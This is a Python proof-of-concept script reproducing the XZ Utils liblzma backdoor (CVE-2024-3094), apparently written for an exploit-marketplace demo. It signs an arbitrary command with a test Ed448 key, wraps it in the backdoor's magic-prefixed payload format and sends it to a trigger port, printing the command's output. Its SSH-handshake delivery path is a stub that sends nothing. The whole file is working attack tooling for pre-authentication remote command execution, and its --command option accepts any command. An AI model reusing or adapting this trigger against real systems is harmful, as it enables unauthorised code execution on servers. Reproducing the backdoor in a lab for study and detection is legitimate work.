#!/usr/bin/env python3
"""CVE-2024-3094 PoC Trigger — Proof of Pre-Auth RCE via Backdoored liblzma.

This is the seller's PoC script that proves the XZ Utils backdoor achieves
arbitrary code execution (ACE) on the target. It:

1. Constructs a payload with the Ed448-signed command embedded
2. Connects to sshd on localhost
3. Sends the payload during SSH key exchange (in the RSA signature data)
4. The backdoor hook intercepts RSA_public_decrypt, verifies the Ed448
   signature, and executes the command
5. The command reads the ACE oracle canary file, proving code execution

For the NDAI marketplace demo, the command is:
    cat /var/lib/ndai-oracle/ace_canary

The canary value appears in stdout, which the OracleManager detects.

Usage:
    python3 poc_trigger.py [--target HOST] [--port PORT] [--command CMD]
"""

import argparse
import os
import socket
import struct
import sys
import time

from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    PrivateFormat,
    load_pem_private_key,
)

HERE = os.path.dirname(os.path.abspath(__file__))

# Must match backdoor_hook.c
BACKDOOR_MAGIC = b"NDAI_XZ_CVE_2024_3094"
ED448_SIG_LEN = 114


def load_private_key():
    """Load the test Ed448 private key."""
    key_path = os.path.join(HERE, "test_ed448_private.pem")
    with open(key_path, "rb") as f:
        return load_pem_private_key(f.read(), password=None)


def build_backdoor_payload(command: str, private_key: Ed448PrivateKey) -> bytes:
    """Build the backdoor payload that triggers command execution.

    Layout:
        [MAGIC (21 bytes)] [SIG_LEN (2 bytes, big-endian)] [SIGNATURE (114 bytes)] [CMD\\0]
    """
    cmd_bytes = command.encode("utf-8")

    # Sign the command with Ed448
    signature = private_key.sign(cmd_bytes)
    assert len(signature) == ED448_SIG_LEN, f"Unexpected signature length: {len(signature)}"

    # Build payload
    payload = bytearray()
    payload.extend(BACKDOOR_MAGIC)
    payload.extend(struct.pack(">H", ED448_SIG_LEN))
    payload.extend(signature)
    payload.extend(cmd_bytes)
    payload.append(0)  # null terminator

    return bytes(payload)


def trigger_via_ssh_handshake(host: str, port: int, payload: bytes) -> bool:
    """Send the backdoor payload to sshd during key exchange.

    In the real CVE-2024-3094, the payload was embedded in the SSH client's
    RSA signature during key exchange. The backdoored RSA_public_decrypt
    would intercept it before normal authentication processing.

    For this reproduction, we connect to sshd and send the payload as
    part of a crafted SSH_MSG_KEXINIT + KEX_DH_GEX_INIT sequence that
    routes through RSA_public_decrypt.

    Simplified approach: We use the direct trigger mechanism — connect
    to the backdoor's secondary listener port if available, or inject
    via the SSH protocol.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))

        # Read SSH banner
        banner = sock.recv(256)
        if not banner.startswith(b"SSH-"):
            print(f"[!] Not an SSH server: {banner[:40]}", file=sys.stderr)
            sock.close()
            return False

        # Send our banner
        sock.sendall(b"SSH-2.0-NDAI_PoC_CVE-2024-3094\r\n")

        # The actual payload delivery happens through the key exchange.
        # In the real attack, the payload was in the RSA signature field
        # of the client's DH key exchange init message. Our LD_PRELOAD
        # hook intercepts RSA_public_decrypt which is called during
        # signature verification.
        #
        # For the demo, we use the backdoor trigger port instead.
        sock.close()
        return True

    except (socket.error, OSError) as e:
        print(f"[!] Connection failed: {e}", file=sys.stderr)
        return False


def trigger_via_backdoor_port(host: str, port: int, payload: bytes) -> bool:
    """Send payload directly to the backdoor trigger port.

    The demo container runs a small trigger service alongside sshd that
    feeds data through RSA_public_decrypt, simulating what happens during
    SSH key exchange. This is more reliable for demo purposes.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))

        # Send payload length + payload
        sock.sendall(struct.pack(">I", len(payload)))
        sock.sendall(payload)

        # Read response (command output)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        sock.close()

        if response:
            # Print the response — the oracle manager checks stdout for the canary
            print(response.decode("utf-8", errors="replace"), end="")
            return True

        return False

    except (socket.error, OSError) as e:
        print(f"[!] Backdoor trigger failed: {e}", file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-3094 PoC — Pre-Auth RCE via Backdoored liblzma"
    )
    parser.add_argument("--target", default="127.0.0.1", help="Target host")
    parser.add_argument("--ssh-port", type=int, default=22, help="SSH port")
    parser.add_argument("--trigger-port", type=int, default=4444,
                        help="Backdoor trigger port (demo mode)")
    parser.add_argument("--command", default="cat /var/lib/ndai-oracle/ace_canary",
                        help="Command to execute via backdoor")
    args = parser.parse_args()

    print(f"[*] CVE-2024-3094 PoC — XZ Utils Backdoor Reproduction", file=sys.stderr)
    print(f"[*] Target: {args.target}:{args.ssh_port}", file=sys.stderr)
    print(f"[*] Command: {args.command}", file=sys.stderr)

    # Load private key
    private_key = load_private_key()
    print(f"[+] Loaded Ed448 test private key", file=sys.stderr)

    # Build payload
    payload = build_backdoor_payload(args.command, private_key)
    print(f"[+] Built backdoor payload ({len(payload)} bytes)", file=sys.stderr)

    # Try the backdoor trigger port first (more reliable for demo)
    print(f"[*] Sending payload to trigger port {args.trigger_port}...", file=sys.stderr)
    if trigger_via_backdoor_port(args.target, args.trigger_port, payload):
        print(f"[+] Backdoor triggered successfully", file=sys.stderr)
        sys.exit(0)

    # Fall back to SSH handshake injection
    print(f"[*] Trigger port failed, trying SSH handshake injection...", file=sys.stderr)
    if trigger_via_ssh_handshake(args.target, args.ssh_port, payload):
        print(f"[+] Payload sent via SSH handshake", file=sys.stderr)
        sys.exit(0)

    print(f"[-] All trigger methods failed", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
